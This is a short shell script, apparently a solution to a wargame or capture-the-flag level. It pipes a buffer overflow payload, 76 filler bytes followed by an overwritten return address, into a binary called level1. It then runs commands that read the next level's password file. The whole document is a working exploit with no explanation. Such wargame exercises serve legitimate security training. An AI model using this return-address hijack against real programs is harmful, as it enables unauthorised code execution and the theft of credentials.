 
#!/bin/sh

(python -c 'print "A"*76 + "\x44\x84\x04\x08"' ; echo 'cd ../level2 ; cat .pass') | ./level1
